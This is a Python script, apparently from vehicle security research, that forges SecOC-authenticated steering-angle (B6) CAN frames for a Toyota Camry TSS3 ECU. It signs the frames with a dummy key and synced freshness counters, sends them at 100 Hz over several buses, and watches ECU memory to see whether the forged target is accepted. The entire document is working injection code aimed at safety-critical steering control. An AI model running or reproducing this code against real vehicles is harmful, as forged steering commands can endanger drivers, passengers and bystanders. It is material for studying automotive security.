import time,threading,collections
from exploit.ephemeral_runtime.camry_f33_runtime_monitor import MonitorSession, decode_secoc_sync, decode_steering_angle_deg
from opendbc.car.toyota.tss3 import TSS3B6CompanionFields,TSS3B6Template,TSS3Freshness,TSS3_B6_DUMMY_SECOC_KEY,build_b6_application,build_b6_secoc_frame,target_angle_deg_to_raw
s=MonitorSession(require_ready_parked=True)
for i,a in enumerate([0xFEBE5364,0xFEBE4C00,0xFEBE4C04,0xFEBE80BC,0xFEBE80B8,0xFEBEF130,0xFEBEADB0,0xFEBECAFC]): s.set_watch(i,a)
s.set_running(True)
end=time.monotonic()+.5
while time.monotonic()<end:
    s.panda.can_recv(); time.sleep(.002)
sync=s.panda.latest(0,0x00F); ang=s.panda.latest(0,0x025)
assert sync and ang
raw=target_angle_deg_to_raw(decode_steering_angle_deg(ang[1]))
print('target_raw',raw)

def snap():
    st=s.read_state(); vals=[bytes.fromhex(v['bytes_le']) for v in st['values']]
    return st, vals[0][0], vals[1][2], vals[3][0], vals[6][0]

def segment(name,bus=None,hz=0,dur=1.0):
    stop=threading.Event(); sent=0; echoes0=s.panda.b6_echo_count(); err=[]
    def sender():
        nonlocal sent
        seq=0; mc=0; cur_reset=None; deadline=time.monotonic(); tpl=TSS3B6Template(); comp=TSS3B6CompanionFields(additive_term_suppress=0,contribution_pct_1=0,contribution_pct_2=0)
        try:
            while not stop.is_set():
                row=s.panda.latest(0,0x00F)
                if row is None:
                    s.panda.can_recv(); continue
                sy=decode_secoc_sync(row[1]); r=int(sy['reset_counter'])
                if r!=cur_reset: cur_reset=r; mc=0
                app=build_b6_application(target_lateral_id=63,target_angle_raw=raw,sequence=seq,template=tpl,companions=comp)
                fr=TSS3Freshness(int(sy['trip_counter']),r,mc)
                a,d,_=build_b6_secoc_frame(TSS3_B6_DUMMY_SECOC_KEY,app,fr)
                s.panda.can_send(a,d,bus,fd=True); sent+=1; seq=(seq+1)&0x3f; mc=(mc+1)&0xff
                deadline+=1/hz; stop.wait(max(0,deadline-time.monotonic()))
        except Exception as e:
            err.append(repr(e)); stop.set()
    st0,g0,rb30,gi0,adb0=snap(); seen=[]
    th=None
    if bus is not None:
        th=threading.Thread(target=sender,daemon=True); th.start()
    t0=time.monotonic(); deadline=t0+dur
    while time.monotonic()<deadline:
        s.panda.can_recv(); st,g,b3,gi,ad=snap(); seen.append((b3,gi,ad)); time.sleep(.002)
    stop.set()
    if th: th.join(1)
    st1,g1,rb31,gi1,adb1=snap(); elapsed=time.monotonic()-t0
    print(name,'bus',bus,'elapsed',round(elapsed,3),'sent',sent,'echo',s.panda.b6_echo_count()-echoes0,'route_delta',(g1-g0)&0xff,'raw63_reads',sum(1 for x in seen if x[0]==63),'genID63_reads',sum(1 for x in seen if x[1]==63),'ADB63_reads',sum(1 for x in seen if x[2]==63),'reads',len(seen),'b3uniq',dict(collections.Counter(x[0] for x in seen)),'err',err)
    time.sleep(.25)
segment('idle')
for b in (0,2,1): segment('marker100',b,100)
s.set_running(False)
